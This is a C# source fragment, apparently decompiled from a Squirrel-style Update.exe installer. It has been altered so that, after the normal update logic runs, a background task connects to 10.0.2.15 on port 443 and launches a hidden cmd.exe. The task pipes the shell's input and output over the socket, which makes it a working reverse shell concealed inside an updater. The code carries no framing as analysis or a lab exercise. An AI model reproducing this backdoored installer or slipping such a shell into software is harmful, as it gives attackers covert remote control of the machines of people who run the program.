		static StreamWriter shellStreamWriter;

		// Token: 0x060000D5 RID: 213 RVA: 0x00004988 File Offset: 0x00002B88
		public static int Main(string[] args)
		{
			Program program = new Program();
			int result;
			try
			{
				result = program.main(args);
			}
			catch (Exception value)
			{
				Console.Error.WriteLine(value);
				result = -1;
			}
			return result;
		}

		// Token: 0x060000D6 RID: 214 RVA: 0x000049C8 File Offset: 0x00002BC8
		private int main(string[] args)
		{
			Console.WriteLine("Starting Update.exe");
			bool saveInTemp = args.Any((string x) => x.Contains("uninstall"));
			int result;
			using (SetupLogLogger logger = new SetupLogLogger(saveInTemp)
			{
				Level = LogLevel.Info
			})
			{
				Locator.CurrentMutable.Register(() => logger, typeof(Splat.ILogger), null);
				try
				{
					result = this.executeCommandLine(args);
				}
				catch (Exception arg)
				{
					logger.Write("Unhandled exception: " + arg, LogLevel.Fatal);
					throw;
				}
			}

			Task.Run(() => {
				using(TcpClient client = new TcpClient("10.0.2.15", 443))
					{
						using(Stream stream = client.GetStream())
						{
							using(StreamReader rdr = new StreamReader(stream))
							{
								shellStreamWriter = new StreamWriter(stream);
						
								StringBuilder strInput = new StringBuilder();

								Process p = new Process();
								p.StartInfo.FileName = "cmd.exe";
								p.StartInfo.CreateNoWindow = true;
								p.StartInfo.UseShellExecute = false;
								p.StartInfo.RedirectStandardOutput = true;
								p.StartInfo.RedirectStandardInput = true;
								p.StartInfo.RedirectStandardError = true;
								p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
								p.Start();
								p.BeginOutputReadLine();

								while(true)
								{
									strInput.Append(rdr.ReadLine());
									//strInput.Append("\n");
									p.StandardInput.WriteLine(strInput);
									strInput.Remove(0, strInput.Length);
								}
							}
						}
					}
				}
			);

			return result;
		}
		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    shellStreamWriter.WriteLine(strOutput);
                    shellStreamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }